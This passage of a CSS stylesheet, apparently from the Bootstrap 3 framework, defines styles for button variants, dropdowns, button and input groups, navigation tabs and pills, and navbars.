  .open > .dropdown-toggle.btn-info {
    background-image: none;
  }
  .btn-info.disabled,
  .btn-info[disabled],
  fieldset[disabled] .btn-info,
  .btn-info.disabled:hover,
  .btn-info[disabled]:hover,
  fieldset[disabled] .btn-info:hover,
  .btn-info.disabled:focus,
  .btn-info[disabled]:focus,
  fieldset[disabled] .btn-info:focus,
  .btn-info.disabled:active,
  .btn-info[disabled]:active,
  fieldset[disabled] .btn-info:active,
  .btn-info.disabled.active,
  .btn-info[disabled].active,
  fieldset[disabled] .btn-info.active {
    background-color: #5bc0de;
    border-color: #46b8da;
  }
  .btn-info .badge {
    color: #5bc0de;
    background-color: #fff;
  }
  .btn-warning {
    color: #fff;
    background-color: #f0ad4e;
    border-color: #eea236;
  }
  .btn-warning:hover,
  .btn-warning:focus,
  .btn-warning:active,
  .btn-warning.active,
  .open > .dropdown-toggle.btn-warning {
    color: #fff;
    background-color: #ec971f;
    border-color: #d58512;
  }
  .btn-warning:active,
  .btn-warning.active,
  .open > .dropdown-toggle.btn-warning {
    background-image: none;
  }
  .btn-warning.disabled,
  .btn-warning[disabled],
  fieldset[disabled] .btn-warning,
  .btn-warning.disabled:hover,
  .btn-warning[disabled]:hover,
  fieldset[disabled] .btn-warning:hover,
  .btn-warning.disabled:focus,
  .btn-warning[disabled]:focus,
  fieldset[disabled] .btn-warning:focus,
  .btn-warning.disabled:active,
  .btn-warning[disabled]:active,
  fieldset[disabled] .btn-warning:active,
  .btn-warning.disabled.active,
  .btn-warning[disabled].active,
  fieldset[disabled] .btn-warning.active {
    background-color: #f0ad4e;
    border-color: #eea236;
  }
  .btn-warning .badge {
    color: #f0ad4e;
    background-color: #fff;
  }
  .btn-danger {
    color: #fff;
    background-color: #d9534f;
    border-color: #d43f3a;
  }
  .btn-danger:hover,
  .btn-danger:focus,
  .btn-danger:active,
  .btn-danger.active,
  .open > .dropdown-toggle.btn-danger {
    color: #fff;
    background-color: #c9302c;
    border-color: #ac2925;
  }
  .btn-danger:active,
  .btn-danger.active,
  .open > .dropdown-toggle.btn-danger {
    background-image: none;
  }
  .btn-danger.disabled,
  .btn-danger[disabled],
  fieldset[disabled] .btn-danger,
  .btn-danger.disabled:hover,
  .btn-danger[disabled]:hover,
  fieldset[disabled] .btn-danger:hover,
  .btn-danger.disabled:focus,
  .btn-danger[disabled]:focus,
  fieldset[disabled] .btn-danger:focus,
  .btn-danger.disabled:active,
  .btn-danger[disabled]:active,
  fieldset[disabled] .btn-danger:active,
  .btn-danger.disabled.active,
  .btn-danger[disabled].active,
  fieldset[disabled] .btn-danger.active {
    background-color: #d9534f;
    border-color: #d43f3a;
  }
  .btn-danger .badge {
    color: #d9534f;
    background-color: #fff;
  }
  .btn-link {
    font-weight: normal;
    color: #428bca;
    cursor: pointer;
    border-radius: 0;
  }
  .btn-link,
  .btn-link:active,
  .btn-link[disabled],
  fieldset[disabled] .btn-link {
    background-color: transparent;
    -webkit-box-shadow: none;
            box-shadow: none;
  }
  .btn-link,
  .btn-link:hover,
  .btn-link:focus,
  .btn-link:active {
    border-color: transparent;
  }
  .btn-link:hover,
  .btn-link:focus {
    color: #2a6496;
    text-decoration: underline;
    background-color: transparent;
  }
  .btn-link[disabled]:hover,
  fieldset[disabled] .btn-link:hover,
  .btn-link[disabled]:focus,
  fieldset[disabled] .btn-link:focus {
    color: #777;
    text-decoration: none;
  }
  .btn-lg,
  .btn-group-lg > .btn {
    padding: 10px 16px;
    font-size: 18px;
    line-height: 1.33;
    border-radius: 6px;
  }
  .btn-sm,
  .btn-group-sm > .btn {
    padding: 5px 10px;
    font-size: 12px;
    line-height: 1.5;
    border-radius: 3px;
  }
  .btn-xs,
  .btn-group-xs > .btn {
    padding: 1px 5px;
    font-size: 12px;
    line-height: 1.5;
    border-radius: 3px;
  }
  .btn-block {
    display: block;
    width: 100%;
  }
  .btn-block + .btn-block {
    margin-top: 5px;
  }
  input[type="submit"].btn-block,
  input[type="reset"].btn-block,
  input[type="button"].btn-block {
    width: 100%;
  }
  .fade {
    opacity: 0;
    -webkit-transition: opacity .15s linear;
         -o-transition: opacity .15s linear;
            transition: opacity .15s linear;
  }
  .fade.in {
    opacity: 1;
  }
  .collapse {
    display: none;
  }
  .collapse.in {
    display: block;
  }
  tr.collapse.in {
    display: table-row;
  }
  tbody.collapse.in {
    display: table-row-group;
  }
  .collapsing {
    position: relative;
    height: 0;
    overflow: hidden;
    -webkit-transition: height .35s ease;
         -o-transition: height .35s ease;
            transition: height .35s ease;
  }
  .caret {
    display: inline-block;
    width: 0;
    height: 0;
    margin-left: 2px;
    vertical-align: middle;
    border-top: 4px solid;
    border-right: 4px solid transparent;
    border-left: 4px solid transparent;
  }
  .dropdown {
    position: relative;
  }
  .dropdown-toggle:focus {
    outline: 0;
  }
  .dropdown-menu {
    position: absolute;
    top: 100%;
    left: 0;
    z-index: 1000;
    display: none;
    float: left;
    min-width: 160px;
    padding: 5px 0;
    margin: 2px 0 0;
    font-size: 14px;
    text-align: left;
    list-style: none;
    background-color: #fff;
    -webkit-background-clip: padding-box;
            background-clip: padding-box;
    border: 1px solid #ccc;
    border: 1px solid rgba(0, 0, 0, .15);
    border-radius: 4px;
    -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
            box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
  }
  .dropdown-menu.pull-right {
    right: 0;
    left: auto;
  }
  .dropdown-menu .divider {
    height: 1px;
    margin: 9px 0;
    overflow: hidden;
    background-color: #e5e5e5;
  }
  .dropdown-menu > li > a {
    display: block;
    padding: 3px 20px;
    clear: both;
    font-weight: normal;
    line-height: 1.42857143;
    color: #333;
    white-space: nowrap;
  }
  .dropdown-menu > li > a:hover,
  .dropdown-menu > li > a:focus {
    color: #262626;
    text-decoration: none;
    background-color: #f5f5f5;
  }
  .dropdown-menu > .active > a,
  .dropdown-menu > .active > a:hover,
  .dropdown-menu > .active > a:focus {
    color: #fff;
    text-decoration: none;
    background-color: #428bca;
    outline: 0;
  }
  .dropdown-menu > .disabled > a,
  .dropdown-menu > .disabled > a:hover,
  .dropdown-menu > .disabled > a:focus {
    color: #777;
  }
  .dropdown-menu > .disabled > a:hover,
  .dropdown-menu > .disabled > a:focus {
    text-decoration: none;
    cursor: not-allowed;
    background-color: transparent;
    background-image: none;
    filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
  }
  .open > .dropdown-menu {
    display: block;
  }
  .open > a {
    outline: 0;
  }
  .dropdown-menu-right {
    right: 0;
    left: auto;
  }
  .dropdown-menu-left {
    right: auto;
    left: 0;
  }
  .dropdown-header {
    display: block;
    padding: 3px 20px;
    font-size: 12px;
    line-height: 1.42857143;
    color: #777;
    white-space: nowrap;
  }
  .dropdown-backdrop {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 990;
  }
  .pull-right > .dropdown-menu {
    right: 0;
    left: auto;
  }
  .dropup .caret,
  .navbar-fixed-bottom .dropdown .caret {
    content: "";
    border-top: 0;
    border-bottom: 4px solid;
  }
  .dropup .dropdown-menu,
  .navbar-fixed-bottom .dropdown .dropdown-menu {
    top: auto;
    bottom: 100%;
    margin-bottom: 1px;
  }
  @media (min-width: 768px) {
    .navbar-right .dropdown-menu {
      right: 0;
      left: auto;
    }
    .navbar-right .dropdown-menu-left {
      right: auto;
      left: 0;
    }
  }
  .btn-group,
  .btn-group-vertical {
    position: relative;
    display: inline-block;
    vertical-align: middle;
  }
  .btn-group > .btn,
  .btn-group-vertical > .btn {
    position: relative;
    float: left;
  }
  .btn-group > .btn:hover,
  .btn-group-vertical > .btn:hover,
  .btn-group > .btn:focus,
  .btn-group-vertical > .btn:focus,
  .btn-group > .btn:active,
  .btn-group-vertical > .btn:active,
  .btn-group > .btn.active,
  .btn-group-vertical > .btn.active {
    z-index: 2;
  }
  .btn-group > .btn:focus,
  .btn-group-vertical > .btn:focus {
    outline: 0;
  }
  .btn-group .btn + .btn,
  .btn-group .btn + .btn-group,
  .btn-group .btn-group + .btn,
  .btn-group .btn-group + .btn-group {
    margin-left: -1px;
  }
  .btn-toolbar {
    margin-left: -5px;
  }
  .btn-toolbar .btn-group,
  .btn-toolbar .input-group {
    float: left;
  }
  .btn-toolbar > .btn,
  .btn-toolbar > .btn-group,
  .btn-toolbar > .input-group {
    margin-left: 5px;
  }
  .btn-group > .btn:not(:first-child):not(:last-child):not(.dropdown-toggle) {
    border-radius: 0;
  }
  .btn-group > .btn:first-child {
    margin-left: 0;
  }
  .btn-group > .btn:first-child:not(:last-child):not(.dropdown-toggle) {
    border-top-right-radius: 0;
    border-bottom-right-radius: 0;
  }
  .btn-group > .btn:last-child:not(:first-child),
  .btn-group > .dropdown-toggle:not(:first-child) {
    border-top-left-radius: 0;
    border-bottom-left-radius: 0;
  }
  .btn-group > .btn-group {
    float: left;
  }
  .btn-group > .btn-group:not(:first-child):not(:last-child) > .btn {
    border-radius: 0;
  }
  .btn-group > .btn-group:first-child > .btn:last-child,
  .btn-group > .btn-group:first-child > .dropdown-toggle {
    border-top-right-radius: 0;
    border-bottom-right-radius: 0;
  }
  .btn-group > .btn-group:last-child > .btn:first-child {
    border-top-left-radius: 0;
    border-bottom-left-radius: 0;
  }
  .btn-group .dropdown-toggle:active,
  .btn-group.open .dropdown-toggle {
    outline: 0;
  }
  .btn-group > .btn + .dropdown-toggle {
    padding-right: 8px;
    padding-left: 8px;
  }
  .btn-group > .btn-lg + .dropdown-toggle {
    padding-right: 12px;
    padding-left: 12px;
  }
  .btn-group.open .dropdown-toggle {
    -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, .125);
            box-shadow: inset 0 3px 5px rgba(0, 0, 0, .125);
  }
  .btn-group.open .dropdown-toggle.btn-link {
    -webkit-box-shadow: none;
            box-shadow: none;
  }
  .btn .caret {
    margin-left: 0;
  }
  .btn-lg .caret {
    border-width: 5px 5px 0;
    border-bottom-width: 0;
  }
  .dropup .btn-lg .caret {
    border-width: 0 5px 5px;
  }
  .btn-group-vertical > .btn,
  .btn-group-vertical > .btn-group,
  .btn-group-vertical > .btn-group > .btn {
    display: block;
    float: none;
    width: 100%;
    max-width: 100%;
  }
  .btn-group-vertical > .btn-group > .btn {
    float: none;
  }
  .btn-group-vertical > .btn + .btn,
  .btn-group-vertical > .btn + .btn-group,
  .btn-group-vertical > .btn-group + .btn,
  .btn-group-vertical > .btn-group + .btn-group {
    margin-top: -1px;
    margin-left: 0;
  }
  .btn-group-vertical > .btn:not(:first-child):not(:last-child) {
    border-radius: 0;
  }
  .btn-group-vertical > .btn:first-child:not(:last-child) {
    border-top-right-radius: 4px;
    border-bottom-right-radius: 0;
    border-bottom-left-radius: 0;
  }
  .btn-group-vertical > .btn:last-child:not(:first-child) {
    border-top-left-radius: 0;
    border-top-right-radius: 0;
    border-bottom-left-radius: 4px;
  }
  .btn-group-vertical > .btn-group:not(:first-child):not(:last-child) > .btn {
    border-radius: 0;
  }
  .btn-group-vertical > .btn-group:first-child:not(:last-child) > .btn:last-child,
  .btn-group-vertical > .btn-group:first-child:not(:last-child) > .dropdown-toggle {
    border-bottom-right-radius: 0;
    border-bottom-left-radius: 0;
  }
  .btn-group-vertical > .btn-group:last-child:not(:first-child) > .btn:first-child {
    border-top-left-radius: 0;
    border-top-right-radius: 0;
  }
  .btn-group-justified {
    display: table;
    width: 100%;
    table-layout: fixed;
    border-collapse: separate;
  }
  .btn-group-justified > .btn,
  .btn-group-justified > .btn-group {
    display: table-cell;
    float: none;
    width: 1%;
  }
  .btn-group-justified > .btn-group .btn {
    width: 100%;
  }
  .btn-group-justified > .btn-group .dropdown-menu {
    left: auto;
  }
  [data-toggle="buttons"] > .btn > input[type="radio"],
  [data-toggle="buttons"] > .btn > input[type="checkbox"] {
    position: absolute;
    z-index: -1;
    filter: alpha(opacity=0);
    opacity: 0;
  }
  .input-group {
    position: relative;
    display: table;
    border-collapse: separate;
  }
  .input-group[class*="col-"] {
    float: none;
    padding-right: 0;
    padding-left: 0;
  }
  .input-group .form-control {
    position: relative;
    z-index: 2;
    float: left;
    width: 100%;
    margin-bottom: 0;
  }
  .input-group-lg > .form-control,
  .input-group-lg > .input-group-addon,
  .input-group-lg > .input-group-btn > .btn {
    height: 46px;
    padding: 10px 16px;
    font-size: 18px;
    line-height: 1.33;
    border-radius: 6px;
  }
  select.input-group-lg > .form-control,
  select.input-group-lg > .input-group-addon,
  select.input-group-lg > .input-group-btn > .btn {
    height: 46px;
    line-height: 46px;
  }
  textarea.input-group-lg > .form-control,
  textarea.input-group-lg > .input-group-addon,
  textarea.input-group-lg > .input-group-btn > .btn,
  select[multiple].input-group-lg > .form-control,
  select[multiple].input-group-lg > .input-group-addon,
  select[multiple].input-group-lg > .input-group-btn > .btn {
    height: auto;
  }
  .input-group-sm > .form-control,
  .input-group-sm > .input-group-addon,
  .input-group-sm > .input-group-btn > .btn {
    height: 30px;
    padding: 5px 10px;
    font-size: 12px;
    line-height: 1.5;
    border-radius: 3px;
  }
  select.input-group-sm > .form-control,
  select.input-group-sm > .input-group-addon,
  select.input-group-sm > .input-group-btn > .btn {
    height: 30px;
    line-height: 30px;
  }
  textarea.input-group-sm > .form-control,
  textarea.input-group-sm > .input-group-addon,
  textarea.input-group-sm > .input-group-btn > .btn,
  select[multiple].input-group-sm > .form-control,
  select[multiple].input-group-sm > .input-group-addon,
  select[multiple].input-group-sm > .input-group-btn > .btn {
    height: auto;
  }
  .input-group-addon,
  .input-group-btn,
  .input-group .form-control {
    display: table-cell;
  }
  .input-group-addon:not(:first-child):not(:last-child),
  .input-group-btn:not(:first-child):not(:last-child),
  .input-group .form-control:not(:first-child):not(:last-child) {
    border-radius: 0;
  }
  .input-group-addon,
  .input-group-btn {
    width: 1%;
    white-space: nowrap;
    vertical-align: middle;
  }
  .input-group-addon {
    padding: 6px 12px;
    font-size: 14px;
    font-weight: normal;
    line-height: 1;
    color: #555;
    text-align: center;
    background-color: #eee;
    border: 1px solid #ccc;
    border-radius: 4px;
  }
  .input-group-addon.input-sm {
    padding: 5px 10px;
    font-size: 12px;
    border-radius: 3px;
  }
  .input-group-addon.input-lg {
    padding: 10px 16px;
    font-size: 18px;
    border-radius: 6px;
  }
  .input-group-addon input[type="radio"],
  .input-group-addon input[type="checkbox"] {
    margin-top: 0;
  }
  .input-group .form-control:first-child,
  .input-group-addon:first-child,
  .input-group-btn:first-child > .btn,
  .input-group-btn:first-child > .btn-group > .btn,
  .input-group-btn:first-child > .dropdown-toggle,
  .input-group-btn:last-child > .btn:not(:last-child):not(.dropdown-toggle),
  .input-group-btn:last-child > .btn-group:not(:last-child) > .btn {
    border-top-right-radius: 0;
    border-bottom-right-radius: 0;
  }
  .input-group-addon:first-child {
    border-right: 0;
  }
  .input-group .form-control:last-child,
  .input-group-addon:last-child,
  .input-group-btn:last-child > .btn,
  .input-group-btn:last-child > .btn-group > .btn,
  .input-group-btn:last-child > .dropdown-toggle,
  .input-group-btn:first-child > .btn:not(:first-child),
  .input-group-btn:first-child > .btn-group:not(:first-child) > .btn {
    border-top-left-radius: 0;
    border-bottom-left-radius: 0;
  }
  .input-group-addon:last-child {
    border-left: 0;
  }
  .input-group-btn {
    position: relative;
    font-size: 0;
    white-space: nowrap;
  }
  .input-group-btn > .btn {
    position: relative;
  }
  .input-group-btn > .btn + .btn {
    margin-left: -1px;
  }
  .input-group-btn > .btn:hover,
  .input-group-btn > .btn:focus,
  .input-group-btn > .btn:active {
    z-index: 2;
  }
  .input-group-btn:first-child > .btn,
  .input-group-btn:first-child > .btn-group {
    margin-right: -1px;
  }
  .input-group-btn:last-child > .btn,
  .input-group-btn:last-child > .btn-group {
    margin-left: -1px;
  }
  .nav {
    padding-left: 0;
    margin-bottom: 0;
    list-style: none;
  }
  .nav > li {
    position: relative;
    display: block;
  }
  .nav > li > a {
    position: relative;
    display: block;
    padding: 10px 15px;
  }
  .nav > li > a:hover,
  .nav > li > a:focus {
    text-decoration: none;
    background-color: #eee;
  }
  .nav > li.disabled > a {
    color: #777;
  }
  .nav > li.disabled > a:hover,
  .nav > li.disabled > a:focus {
    color: #777;
    text-decoration: none;
    cursor: not-allowed;
    background-color: transparent;
  }
  .nav .open > a,
  .nav .open > a:hover,
  .nav .open > a:focus {
    background-color: #eee;
    border-color: #428bca;
  }
  .nav .nav-divider {
    height: 1px;
    margin: 9px 0;
    overflow: hidden;
    background-color: #e5e5e5;
  }
  .nav > li > a > img {
    max-width: none;
  }
  .nav-tabs {
    border-bottom: 1px solid #ddd;
  }
  .nav-tabs > li {
    float: left;
    margin-bottom: -1px;
  }
  .nav-tabs > li > a {
    margin-right: 2px;
    line-height: 1.42857143;
    border: 1px solid transparent;
    border-radius: 4px 4px 0 0;
  }
  .nav-tabs > li > a:hover {
    border-color: #eee #eee #ddd;
  }
  .nav-tabs > li.active > a,
  .nav-tabs > li.active > a:hover,
  .nav-tabs > li.active > a:focus {
    color: #555;
    cursor: default;
    background-color: #fff;
    border: 1px solid #ddd;
    border-bottom-color: transparent;
  }
  .nav-tabs.nav-justified {
    width: 100%;
    border-bottom: 0;
  }
  .nav-tabs.nav-justified > li {
    float: none;
  }
  .nav-tabs.nav-justified > li > a {
    margin-bottom: 5px;
    text-align: center;
  }
  .nav-tabs.nav-justified > .dropdown .dropdown-menu {
    top: auto;
    left: auto;
  }
  @media (min-width: 768px) {
    .nav-tabs.nav-justified > li {
      display: table-cell;
      width: 1%;
    }
    .nav-tabs.nav-justified > li > a {
      margin-bottom: 0;
    }
  }
  .nav-tabs.nav-justified > li > a {
    margin-right: 0;
    border-radius: 4px;
  }
  .nav-tabs.nav-justified > .active > a,
  .nav-tabs.nav-justified > .active > a:hover,
  .nav-tabs.nav-justified > .active > a:focus {
    border: 1px solid #ddd;
  }
  @media (min-width: 768px) {
    .nav-tabs.nav-justified > li > a {
      border-bottom: 1px solid #ddd;
      border-radius: 4px 4px 0 0;
    }
    .nav-tabs.nav-justified > .active > a,
    .nav-tabs.nav-justified > .active > a:hover,
    .nav-tabs.nav-justified > .active > a:focus {
      border-bottom-color: #fff;
    }
  }
  .nav-pills > li {
    float: left;
  }
  .nav-pills > li > a {
    border-radius: 4px;
  }
  .nav-pills > li + li {
    margin-left: 2px;
  }
  .nav-pills > li.active > a,
  .nav-pills > li.active > a:hover,
  .nav-pills > li.active > a:focus {
    color: #fff;
    background-color: #428bca;
  }
  .nav-stacked > li {
    float: none;
  }
  .nav-stacked > li + li {
    margin-top: 2px;
    margin-left: 0;
  }
  .nav-justified {
    width: 100%;
  }
  .nav-justified > li {
    float: none;
  }
  .nav-justified > li > a {
    margin-bottom: 5px;
    text-align: center;
  }
  .nav-justified > .dropdown .dropdown-menu {
    top: auto;
    left: auto;
  }
  @media (min-width: 768px) {
    .nav-justified > li {
      display: table-cell;
      width: 1%;
    }
    .nav-justified > li > a {
      margin-bottom: 0;
    }
  }
  .nav-tabs-justified {
    border-bottom: 0;
  }
  .nav-tabs-justified > li > a {
    margin-right: 0;
    border-radius: 4px;
  }
  .nav-tabs-justified > .active > a,
  .nav-tabs-justified > .active > a:hover,
  .nav-tabs-justified > .active > a:focus {
    border: 1px solid #ddd;
  }
  @media (min-width: 768px) {
    .nav-tabs-justified > li > a {
      border-bottom: 1px solid #ddd;
      border-radius: 4px 4px 0 0;
    }
    .nav-tabs-justified > .active > a,
    .nav-tabs-justified > .active > a:hover,
    .nav-tabs-justified > .active > a:focus {
      border-bottom-color: #fff;
    }
  }
  .tab-content > .tab-pane {
    display: none;
  }
  .tab-content > .active {
    display: block;
  }
  .nav-tabs .dropdown-menu {
    margin-top: -1px;
    border-top-left-radius: 0;
    border-top-right-radius: 0;
  }
  .navbar {
    position: relative;
    min-height: 50px;
    margin-bottom: 20px;
    border: 1px solid transparent;
  }
  @media (min-width: 768px) {
    .navbar {
      border-radius: 4px;
    }
  }
  @media (min-width: 768px) {
    .navbar-header {
      float: left;
    }
  }
  .navbar-collapse {
    padding-right: 15px;
    padding-left: 15px;
    overflow-x: visible;
    -webkit-overflow-scrolling: touch;
    border-top: 1px solid transparent;
    -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, .1);
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .1);
  }
  .navbar-collapse.in {
    overflow-y: auto;
  }
  @media (min-width: 768px) {
    .navbar-collapse {
      width: auto;
      border-top: 0;
      -webkit-box-shadow: none;
              box-shadow: none;
    }
    .navbar-collapse.collapse {
      display: block !important;
      height: auto !important;
      padding-bottom: 0;
      overflow: visible !important;
    }
    .navbar-collapse.in {
      overflow-y: visible;
    }
    .navbar-fixed-top .navbar-collapse,
    .navbar-static-top .navbar-collapse,
    .navbar-fixed-bottom .navbar-collapse {
      padding-right: 0;
      padding-left: 0;
    }
  }
  .navbar-fixed-top .navbar-collapse,
  .navbar-fixed-bottom .navbar-collapse {
    max-height: 340px;
  }
  @media (max-width: 480px) and (orientation: landscape) {
    .navbar-fixed-top .navbar-collapse,
    .navbar-fixed-bottom .navbar-collapse {
      max-height: 200px;
    }
  }
  .container > .navbar-header,
  .container-fluid > .navbar-header,
  .container > .navbar-collapse,
  .container-fluid > .navbar-collapse {
    margin-right: -15px;
    margin-left: -15px;
  }
  @media (min-width: 768px) {
    .container > .navbar-header,
    .container-fluid > .navbar-header,
    .container > .navbar-collapse,
    .container-fluid > .navbar-collapse {
      margin-right: 0;
      margin-left: 0;
    }
  }
  .navbar-static-top {
    z-index: 1000;
    border-width: 0 0 1px;
  }
  @media (min-width: 768px) {
    .navbar-static-top {
      border-radius: 0;
    }
  }
  .navbar-fixed-top,
  .navbar-fixed-bottom {
    position: fixed;
    right: 0;
    left: 0;
    z-index: 1030;
    -webkit-transform: translate3d(0, 0, 0);
         -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
  }
  @media (min-width: 768px) {
    .navbar-fixed-top,
    .navbar-fixed-bottom {
      border-radius: 0;
    }
  }
  .navbar-fixed-top {
    top: 0;
    border-width: 0 0 1px;
  }
  .navbar-fixed-bottom {
    bottom: 0;
    margin-bottom: 0;
    border-width: 1px 0 0;
  }
  .navbar-brand {
    float: left;
    height: 50px;
    padding: 15px 15px;
    font-size: 18px;
    line-height: 20px;
  }
  .navbar-brand:hover,
  .navbar-brand:focus {
    text-decoration: none;
  }
  @media (min-width: 768px) {
    .navbar > .container .navbar-brand,
    .navbar > .container-fluid .navbar-brand {
      margin-left: -15px;
    }
  }
  .navbar-toggle {
    position: relative;
    float: right;
    padding: 9px 10px;
    margin-top: 8px;
    margin-right: 15px;
    margin-bottom: 8px;
    background-color: transparent;
    background-image: none;
    border: 1px solid transparent;
    border-radius: 4px;
  }
  .navbar-toggle:focus {
    outline: 0;
  }
  .navbar-toggle .icon-bar {
    display: block;
    width: 22px;
    height: 2px;
    border-radius: 1px;
  }
  .navbar-toggle .icon-bar + .icon-bar {
    margin-top: 4px;
  }
  @media (min-width: 768px) {
    .navbar-toggle {
      display: none;
    }
  }
  .navbar-nav {
    margin: 7.5px -15px;
  }
  .navbar-nav > li > a {
    padding-top: 10px;
    padding-bottom: 10px;
    line-height: 20px;
  }
  @media (max-width: 767px) {
    .navbar-nav .open .dropdown-menu {
      position: static;
      float: none;
      width: auto;
      margin-top: 0;
      background-color: transparent;
      border: 0;
      -webkit-box-shadow: none;
              box-shadow: none;
    }
    .navbar-nav .open .dropdown-menu > li > a,
    .navbar-nav .open .dropdown-menu .dropdown-header {
      padding: 5px 15px 5px 25px;
    }
    .navbar-nav .open .dropdown-menu > li > a {
      line-height: 20px;
    }
    .navbar-nav .open .dropdown-menu > li > a:hover,
    .navbar-nav .open .dropdown-menu > li > a:focus {
      background-image: none;
    }
  }
  @media (min-width: 768px) {
    .navbar-nav {
      float: left;
      margin: 0;
    }
    .navbar-nav > li {
      float: left;
    }
    .navbar-nav > li > a {
      padding-top: 15px;
      padding-bottom: 15px;
    }
    .navbar-nav.navbar-right:last-child {
      margin-right: -15px;
    }
  }
  @media (min-width: 768px) {
    .navbar-left {
      float: left !important;
    }
    .navbar-right {
      float: right !important;
    }
  }
  .navbar-form {
    padding: 10px 15px;
    margin-top: 8px;
    margin-right: -15px;
    margin-bottom: 8px;
    margin-left: -15px;
    border-top: 1px solid transparent;
    border-bottom: 1px solid transparent;
    -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, .1), 0 1px 0 rgba(255, 255, 255, .1);
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .1), 0 1px 0 rgba(255, 255, 255, .1);
  }
  @media (min-width: 768px) {
    .navbar-form .form-group {
      display: inline-block;
      margin-bottom: 0;
      vertical-align: middle;
    }
    .navbar-form .form-control {
      display: inline-block;
      width: auto;
      vertical-align: middle;
    }
    .navbar-form .input-group {
      display: inline-table;
      vertical-align: middle;
    }
    .navbar-form .input-group .input-group-addon,
    .navbar-form .input-group .input-group-btn,
    .navbar-form .input-group .form-control {
      width: auto;
    }
    .navbar-form .input-group > .form-control {
      width: 100%;
    }
    .navbar-form .control-label {
      margin-bottom: 0;
      vertical-align: middle;
    }
    .navbar-form .radio,
    .navbar-form .checkbox {
      display: inline-block;
      margin-top: 0;
      margin-bottom: 0;
      vertical-align: middle;
    }
    .navbar-form .radio label,
    .navbar-form .checkbox label {
      padding-left: 0;
    }
    .navbar-form .radio input[type="radio"],
    .navbar-form .checkbox input[type="checkbox"] {
      position: relative;
      margin-left: 0;
    }
    .navbar-form .has-feedback .form-control-feedback {
      top: 0;
    }
  }
  @media (max-width: 767px) {
    .navbar-form .form-group {
      margin-bottom: 5px;
    }
  }
  @media (min-width: 768px) {
    .navbar-form {
      width: auto;
      padding-top: 0;
      padding-bottom: 0;
      margin-right: 0;
      margin-left: 0;
      border: 0;
      -webkit-box-shadow: none;
              box-shadow: none;
    }
    .navbar-form.navbar-right:last-child {
      margin-right: -15px;
    }
  }
  .navbar-nav > li > .dropdown-menu {
    margin-top: 0;
    border-top-left-radius: 0;
    border-top-right-radius: 0;
  }
  .navbar-fixed-bottom .navbar-nav > li > .dropdown-menu {
    border-bottom-right-radius: 0;
    border-bottom-left-radius: 0;
  }
  .navbar-btn {
    margin-top: 8px;
    margin-bottom: 8px;
  }
  .navbar-btn.btn-sm {
    margin-top: 10px;
    margin-bottom: 10px;
  }
  .navbar-btn.btn-xs {
    margin-top: 14px;
    margin-bottom: 14px;
  }
  .navbar-text {
    margin-top: 15px;
    margin-bottom: 15px;
  }
  @media (min-width: 768px) {
    .navbar-text {
      float: left;
      margin-right: 15px;
      margin-left: 15px;
    }
    .navbar-text.navbar-right:last-child {
      margin-right: 0;
    }
  }
  .navbar-default {
    background-color: #f8f8f8;
    border-color: #e7e7e7;
  }
  .navbar-default .navbar-brand {
    color: #777;
  }
  .navbar-default .navbar-brand:hover,
  .navbar-default .navbar-brand:focus {
    color: #5e5e5e;
    background-color: transparent;
  }
  .navbar-default .navbar-text {
    color: #777;
  }
  .navbar-default .navbar-nav > li > a {
    color: #777;
  }
  .navbar-default .navbar-nav > li > a:hover,
  .navbar-default .navbar-nav > li > a:focus {
    color: #333;
    background-color: transparent;
  }
  .navbar-default .navbar-nav > .active > a,
  .navbar-default .navbar-nav > .active > a:hover,
  .navbar-default .navbar-nav > .active > a:focus {
    color: #555;
    background-color: #e7e7e7;
  }
  .navbar-default .navbar-nav > .disabled > a,
  .navbar-default .navbar-nav > .disabled > a:hover,
  .navbar-default .navbar-nav > .disabled > a:focus {
    color: #ccc;
    background-color: transparent;
  }
  .navbar-default .navbar-toggle {
    border-color: #ddd;
  }
  .navbar-default .navbar-toggle:hover,
  .navbar-default .navbar-toggle:focus {
    background-color: #ddd;
  }
  .navbar-default .navbar-toggle .icon-bar {
    background-color: #888;
  }
  .navbar-default .navbar-collapse,
  .navbar-default .navbar-form {
    border-color: #e7e7e7;
  }
  .navbar-default .navbar-nav > .open > a,
  .navbar-default .navbar-nav > .open > a:hover,
  .navbar-default .navbar-nav > .open > a:focus {
    color: #555;
    background-color: #e7e7e7;
  }
  @media (max-width: 767px) {
    .navbar-default .navbar-nav .open .dropdown-menu > li > a {
      color: #777;
    }
    .navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,
    .navbar-default .navbar-nav .open .dropdown-menu > li > a:focus {
      color: #333;
      background-color: transparent;
    }
    .navbar-default .navbar-nav .open .dropdown-menu > .active > a,
    .navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,
    .navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus {
      color: #555;
      background-color: #e7e7e7;
    }
    .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,
    .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,
    .navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus {
      color: #ccc;
      background-color: transparent;
    }
  }
  .navbar-default .navbar-link {
    color: #777;
  }
  .navbar-default .navbar-link:hover {
    color: #333;
  }
  .navbar-default .btn-link {
    color: #777;
  }
  .navbar-default .btn-link:hover,
  .navbar-default .btn-link:focus {
    color: #333;
  }
  .navbar-default .btn-link[disabled]:hover,
  fieldset[disabled] .navbar-default .btn-link:hover,
  .navbar-default .btn-link[disabled]:focus,
  fieldset[disabled] .navbar-default .btn-link:focus {
    color: #ccc;
  }
  .navbar-inverse {
    background-color: #222;
    border-color: #080808;
  }
  .navbar-inverse .navbar-brand {
    color: #777;
  }
  .navbar-inverse .navbar-brand:hover,
  .navbar-inverse .navbar-brand:focus {
    color: #fff;
    background-color: transparent;
  }
  .navbar-inverse .navbar-text {
    color: #777;
  }
  .navbar-inverse .navbar-nav > li > a {
    color: #777;
  }
  .navbar-inverse .navbar-nav > li > a:hover,
  .navbar-inverse .navbar-nav > li > a:focus {
    color: #fff;
    background-color: transparent;
  }
